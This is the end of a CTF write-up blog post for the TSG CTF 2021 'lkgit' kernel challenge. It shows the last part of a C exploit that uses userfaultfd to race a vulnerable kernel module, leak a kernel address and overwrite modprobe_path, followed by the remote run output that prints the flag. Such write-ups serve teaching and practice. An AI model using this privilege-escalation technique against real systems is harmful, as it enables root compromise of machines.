    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /home/user/flag /home/user/flag2</span><span class="se">\n</span><span class="s">/bin/chmod 777 /home/user/flag2' &gt; /home/user/copy.sh"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/user/copy.sh"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /home/user/dummy"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/user/dummy"</span><span class="p">);</span>

    <span class="p">...</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Register new userfaultfd</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">uffdargs</span> <span class="o">=</span> <span class="n">register_userfaultfd</span><span class="p">(</span><span class="n">UFFDIO_REGISTER_MODE_MISSING</span> <span class="o">|</span> <span class="n">UFFDIO_REGISTER_MODE_WP</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">break_on_read_overwrite</span><span class="p">);</span>
    
    <span class="c1">// Align the request object, so that lkgit_amend_message will pagefault on reading new message</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">lkgit_fd</span><span class="p">,</span> <span class="n">LKGIT_AMEND_MESSAGE</span><span class="p">,</span> <span class="n">uffdargs</span><span class="o">-&gt;</span><span class="n">page_start</span><span class="o">+</span><span class="mh">0x1000</span><span class="o">-</span><span class="mh">0x10</span><span class="o">-</span><span class="mh">0x40</span><span class="p">);</span>
    
    <span class="n">close</span><span class="p">(</span><span class="n">lkgit_fd</span><span class="p">);</span>
    
    <span class="c1">// Execute modprobe_path exploitation</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/home/user/dummy"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /home/user/flag2"</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Everything in place, let’s run it on remote and get another flag :)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Create initial file in lkgit
[+] Register userfaultfd

Register userfaultdfd
======================================================================
[+] Userfaultfd registered : FD 4 / Flags: 0x1
[+] Userfaultfd api : Features 0x1ff
[+] Userfaultfd region : 0x7f20d012a000 - 0x7f20d012c000[+] Userfaultfd region registered: ioctls 0x5c
[+] Userfaultfd process thread started: 0x7f20d0123f38
======================================================================

[+] Request file, and let it break on copying back message
Userfault event
======================================================================
PAGEFAULT : 0x7f20d012b000 / Flags 0x1
UFFDIO_COPY
Userfault: break_on_read
[+]Delete current object by storing one with the same hash
[+] Create a shmem struct in the freed object[+] spray shmem structs
[+] Kernel leak   : 0xffffffffac76e800
[+] modprobe_path : 0xffffffffac63cb20

Unregister userfaultdfd
======================================================================
[+] Sent UFFDIO_COPY event to userfaultfd
======================================================================

[+] userfaultfd unregistered
======================================================================

[+] Register new userfaultfd

Register userfaultdfd
======================================================================
[+] Userfaultfd registered : FD 4 / Flags: 0x1
[+] Userfaultfd api : Features 0x1ff
[+] Userfaultfd region : 0x7f20d012a000 - 0x7f20d012c000[+] Userfaultfd region registered: ioctls 0x5c
[+] Userfaultfd process thread started: 0x7f20d00fbf38
======================================================================

Userfault event
======================================================================
PAGEFAULT : 0x7f20d012b000 / Flags 0
UFFDIO_COPY
[+] Sent UFFDIO_COPY event to userfaultfd
======================================================================

/home/user/dummy: line 1: \xff\xff\xff\xff: not found
TSGCTF{google_took_2years_but_you_found_hash_collision_in_a_day!}</code></pre></figure>



    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=TSG CTF 2021 - lkgit&amp;url=https://kileak.github.io/ctf/2021/tsg-lkgit/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/tsg-lkgit/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2021/tsg-lkgit';
        var disqus_title = 'TSG CTF 2021 - lkgit';
        var disqus_url = 'https://kileak.github.io/ctf/2021/tsg-lkgit';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
